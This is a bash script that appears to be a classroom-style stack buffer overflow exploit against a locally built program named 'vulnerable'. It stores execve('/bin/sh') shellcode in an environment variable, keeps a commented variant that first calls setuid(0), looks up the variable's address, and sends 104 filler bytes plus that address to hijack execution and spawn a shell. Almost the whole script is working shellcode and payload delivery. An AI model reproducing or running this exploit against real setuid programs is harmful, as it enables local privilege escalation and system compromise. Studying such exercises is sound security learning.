#!/bin/bash

# Build executables
make getenvaddress vulnerable
# Export shellcode to environment variable
# Shellcode just spawning a shell
export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')")
# Shellcode also executing setuid(0) before (see https://www.exploit-db.com/shellcodes/13320)
# export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05')")
# Get stack address of the environment variable
addr=$(./getenvaddress EGG ./vulnerable | grep -e "0x[0-9a-fA-F]*" -o)
# Overflow stack buffer and spawn a shell
(
    python3 -c "from struct import pack; import sys; sys.stdout.buffer.write(b'A' * 104 + pack('<Q', $(echo $addr)))"
    cat
) | ./vulnerable
